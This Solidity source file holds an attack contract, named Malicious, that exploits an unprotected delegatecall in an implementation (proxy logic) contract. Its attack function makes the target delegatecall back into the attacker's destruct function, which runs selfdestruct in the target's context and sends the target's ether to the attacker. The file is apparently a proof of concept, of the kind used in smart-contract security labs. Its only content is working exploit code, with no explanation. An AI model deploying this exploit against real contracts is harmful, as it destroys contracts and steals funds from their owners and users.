// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IImpl {
    function callContract(address a, bytes calldata _calldata) external payable  returns (bytes memory);
    function delegatecallContract(address a, bytes calldata _calldata) external payable  returns (bytes memory);
}

/// The implementation malicious contract to exploit implementation
contract Malicious {
    address payable private attacker;

    constructor(){
      attacker = payable(msg.sender);
    }

  
    /*
      * Function that call the exploit in implementation contract
      */
    function attack(address _impl) external {
      bytes memory data = abi.encodeWithSignature("delegatecallContract(address,bytes)", address(this), abi.encodeWithSignature("destruct()"));
      IImpl(_impl).callContract(_impl,data);
    }

    /*
    * Function to be executed in the context of implementation contract
    */
    function destruct() external {
        selfdestruct(attacker);
    }
}
